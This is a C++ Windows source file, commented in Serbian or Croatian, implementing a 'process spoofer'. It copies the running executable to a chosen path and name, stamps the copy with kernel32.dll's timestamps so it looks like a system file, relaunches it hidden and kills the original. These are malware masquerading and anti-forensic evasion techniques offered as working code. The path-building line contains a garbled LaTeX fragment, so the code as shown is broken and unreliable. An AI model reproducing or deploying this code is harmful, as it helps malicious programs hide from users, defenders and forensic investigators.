#include "process_spoofer.h"
#include <windows.h>
#include <string>
#include <vector>

namespace ProcessSpoofer {

    bool SpoofProcess(const char* newName, const char* newPath) {
        // 1. Dobijanje putanje do trenutnog izvršnog fajla
        char currentPath[MAX_PATH];
        if (GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0) {
            return false; // Ne možemo dobiti putanju, izlaz
        }

        // 2. Formiranje nove putanje
        std::string newFullPath = std::string(newPath) + "\includegraphics[width=0.5em]{/}" + std::string(newName);

        // Ako smo već pokrenuti sa lažne putanje, ne radi ništa
        if (_stricmp(currentPath, newFullPath.c_str()) == 0) {
            return true; // Već smo "spoofovani", nastavi sa radom
        }

        // 3. Kreiranje direktorijuma ako ne postoji
        CreateDirectoryA(newPath, NULL);

        // 4. Kopiiranje fajla na novu lokaciju
        if (!CopyFileA(currentPath, newFullPath.c_str(), FALSE)) {
            // Ako fajl već postoji i zaključan je, to je takođe znak da je proces aktivan
            if (GetLastError() == ERROR_SHARING_VIOLATION) {
                return true;
            }
            return false;
        }

        // 5. "Stomp" vremenskih oznaka da izgleda kao sistemski fajl
        TimeStampStomp(newFullPath.c_str(), "C:\\Windows\\System32\\kernel32.dll");

        // 6. Pokretanje novog procesa sa nove lokacije
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcessA(newFullPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, newPath, &si, &pi)) {
            return false;
        }

        // 7. Zatvaranje handle-ova i gašenje starog procesa
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        // Gašenje originalnog procesa
        exit(0);

        return true; // Tehnički, nikada nećemo doći do ovde
    }

    bool TimeStampStomp(const char* targetFile, const char* sourceFile) {
        HANDLE hSource = CreateFileA(sourceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hSource == INVALID_HANDLE_VALUE) {
            return false;
        }

        HANDLE hTarget = CreateFileA(targetFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hTarget == INVALID_HANDLE_VALUE) {
            CloseHandle(hSource);
            return false;
        }

        FILETIME ftCreate, ftAccess, ftWrite;
        if (!GetFileTime(hSource, &ftCreate, &ftAccess, &ftWrite)) {
            CloseHandle(hSource);
            CloseHandle(hTarget);
            return false;
        }

        if (!SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite)) {
            CloseHandle(hSource);
            CloseHandle(hTarget);
            return false;
        }

        CloseHandle(hSource);
        CloseHandle(hTarget);
        return true;
    }
}